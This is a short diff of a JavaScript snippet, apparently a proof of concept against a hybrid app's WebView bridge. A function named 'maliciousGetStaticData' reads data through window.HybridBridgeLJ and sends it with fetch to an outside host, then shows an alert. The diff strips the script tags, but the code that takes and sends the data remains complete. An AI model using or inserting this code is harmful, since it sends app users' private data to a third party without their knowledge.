@@ -1,5 +1,3 @@
-<script>
-
 function maliciousGetStaticData() {
     var data = window.HybridBridgeLJ._getStaticData();
     fetch("http://haku.eyes.sh?beike", {
@@ -8,6 +6,5 @@ function maliciousGetStaticData() {
     });
     alert(data);
  }
-
 maliciousGetStaticData();
-</script>
+
